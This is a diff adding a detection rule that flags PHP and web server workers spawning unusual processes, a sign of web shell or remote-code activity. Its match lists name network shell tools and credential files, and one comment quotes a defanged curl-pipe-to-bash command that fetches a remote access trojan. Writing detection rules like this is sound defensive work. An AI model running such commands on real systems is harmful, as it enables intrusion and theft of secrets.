@@ -1,0 +1,68 @@
+id: Z0J8A5mRf6bn
+name: Possible PHP Worker Spawning Unusual Process (via cmdline)
+body: |-
+  title: Possible PHP Worker Spawning Unusual Process (via cmdline)
+  id: 0524fca5-8a89-4d38-9a75-fe7dcba39271
+  description: Detects a PHP worker spawning an anomalous child process via the command line, indicating potential remote code execution (RCE) or web shell activity.
+  status: stable
+  author: SOC Prime Team
+  references:
+    - https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/
+    - https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
+    - https://medium.com/@p.matkovski/detection-of-php-web-shells-with-access-log-waf-and-audit-deamon-e798d4c95ec
+    - https://redcanary.com/threat-detection-report/trends/webshells/
+  tags:
+    - attack.initial_access
+    - attack.t1190
+  logsource:
+    product: linux
+    category: process_creation
+  detection:
+    selection_parent:
+      - ParentImage|endswith:
+        - '/php-cgi'
+        - '/frankenphp'
+        - '/sw-engine-fpm'
+        - '/httpd'
+        - '/apache2'
+        - '/nginx'
+      - ParentImage|contains:
+        - '/php-fpm' #php-fpm; php-fpm8.3, etc
+        - '/lsphp'
+    selection_child:
+      CommandLine|contains:
+        - 'ruby'
+        - 'ncat'
+        - 'curl' # shell_exec/system/exec curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/
+        - 'wget'
+        - 'python'
+        - 'perl' # May be noisy!
+        - 'nc '
+        - 'nohup'
+    selection_recon:
+      Image|endswith:
+        - '/whoami'
+        - '/id'
+        - '/uname'
+    selection_sh_combo:
+      Image|endswith: 'sh' # /bin/sh
+      CommandLine|contains:
+        - 'mkfifo'
+        - 'socat'
+        - '-c'
+        - 'base64'
+        - '/tmp'
+        #- '/dev/shm'
+        - 'chmod'
+        - '/dev'
+        - 'id>/out' # https://github.com/9bie/php2shell-bypass-aslr-exp/tree/main
+        - '.aws/credentials'
+        - 'secrets/kubernetes.io'
+        - 'shadow'
+    condition: selection_parent and (selection_child or selection_recon or selection_sh_combo)
+  falsepositives:
+    - Unknown
+  level: medium
+level: medium
+created: '2023-07-12T11:02:20Z'
+updated: '2026-11-03T10:23:16.336000Z'
